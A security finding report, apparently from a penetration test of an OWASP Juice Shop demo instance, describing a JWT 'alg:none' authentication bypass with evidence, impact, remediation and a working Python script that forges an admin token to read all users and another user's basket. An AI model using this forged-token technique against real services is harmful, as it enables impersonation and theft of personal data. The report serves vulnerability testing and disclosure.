# Authentication bypass via unsigned JWT with alg:none (arbitrary identity forgery including admin)

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-09-11 19:53:07 UTC
**Target:** http://host.docker.internal:3001
**CVSS:** 9.4
**Confidence:** High
**Fix Effort:** Low

## Description

The backend accepts JWTs with algorithm `none` and an empty signature, allowing any unauthenticated attacker to mint a token for an arbitrary identity — including the `admin` role — and receive full authenticated, admin-authorized access.

## Evidence

Forged token header `{"typ":"JWT","alg":"none"}` with payload setting `id:1, email:"admin@juice-sh.op", role:"admin"` and empty signature segment, sent as `Authorization: Bearer` to `GET /api/Users` → `200 {"status":"success","data":[{"id":1,...,"email":"admin@juice-sh.op","role":"admin",...}` (full user list). `GET /rest/basket/1` → `200` with another user's basket. Negative controls: RS256 token with invalid signature → `401 UnauthorizedError: invalid signature`; garbage token → `401 UnauthorizedError: Invalid token`. This proves signed-token verification works and only the unsigned variant is accepted.

## Impact

Complete unauthenticated authentication bypass: the attacker impersonates any user or the administrator without knowing any credentials or possessing any key. Demonstrated as the seeded admin (full user list disclosure including all customers' emails and account metadata, cross-user basket access); the same forgery works against any user id for horizontal impersonation of orders, wallets, and personal data, and enables all admin write actions (product/price modification, order delivery status, accounting).

## Counterevidence

Actively tested the alternative forgery paths to bound the issue: an RS256 token with an invalid signature is correctly rejected with `UnauthorizedError: invalid signature`, and a garbage token is rejected with `UnauthorizedError: Invalid token` — so the server does run signature verification for signed tokens and the weakness is specifically the acceptance of the unsigned `alg:none` variant. I searched the unauthenticated `/rest/admin/application-configuration` dump, `/api-docs` Swagger spec, `/metrics`, `/robots.txt`, `/public/images/tracking.gif` and the 1.2MB `main.js` client bundle for exposed RSA key material (public/private key strings, jwtKey, PEM markers) and found none, so no key-confusion path was needed or available — the `alg:none` acceptance alone completes the bypass.

## What Would Change This Severity

If the deployment pinned the accepted algorithm list on the JWT verification middleware, this bypass would close entirely; acceptance of `alg:none` was verified live and no such pinning exists.

## Technical Analysis

The JWT verification middleware does not pin the allowed `alg` header values to RS256. When presented with `{"alg":"none"}` and an empty signature segment, verification succeeds without any cryptographic proof, and the middleware then trusts the entire payload — including `data.role`, `data.id`, and `bid` — for authorization decisions. Signed RS256 tokens ARE verified (invalid signatures are rejected with `UnauthorizedError: invalid signature`), so the flaw is isolated to the acceptance of the unsigned algorithm variant.

## Proof of Concept

1. Base64url-encode header `{"typ":"JWT","alg":"none"}` and a payload shaped like a legitimate Juice Shop token: `{"data":{"id":1,"email":"admin@juice-sh.op","role":"admin","isActive":true,...},"bid":1,"iat":<ts>}`. 2. Concatenate as `header.payload.` (empty third segment). 3. Send it as `Authorization: Bearer <token>` to `GET /api/Users` — a 200 with the full user list is returned, proving the forged admin identity is honored by server-side authorization. 4. Repeat on `GET /rest/basket/1` to read another user's basket. 5. Negative controls: the same payload signed as RS256 with a bogus signature is rejected 401 (`invalid signature`), confirming the vulnerability is specifically the acceptance of `alg:none`.

```python
import base64, json, requests

BASE = "http://host.docker.internal:3001"

def b64u(obj):
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()

header = {"typ": "JWT", "alg": "none"}
payload = {
    "data": {
        "id": 1, "email": "admin@juice-sh.op", "password": "", "role": "admin",
        "deluxeToken": "", "lastLoginIp": "0.0.0.0", "profileImage": "",
        "totpSecret": "", "isActive": True,
        "createdAt": "2026-09-11T00:00:00.000Z", "updatedAt": "2026-09-11T00:00:00.000Z",
        "deletedAt": None,
    },
    "bid": 1, "iat": 1789156119,
}
forged = f"{b64u(header)}.{b64u(payload)}."

users = requests.get(f"{BASE}/api/Users", headers={"Authorization": f"Bearer {forged}"})
print(users.status_code, "users:", len(users.json()["data"]))          # 200, full user list
basket = requests.get(f"{BASE}/rest/basket/1", headers={"Authorization": f"Bearer {forged}"})
print(basket.status_code, "basket owner id:", basket.json()["UserId"]) # 200, UserId 1
```

## Remediation

Pin the accepted JWT algorithms server-side to the expected signature scheme (RS256) and reject any token whose header declares `alg:none` or any unsigned variant; upgrade the JWT middleware/library to a version that refuses unsigned tokens by default. Additionally, never derive authorization decisions (role, user id, basket id) solely from token claims without validating signature and algorithm first.

## Assumptions

Demo instance with seeded data; the forged identity targets the seeded admin account (id=1). No credentials of any kind required.
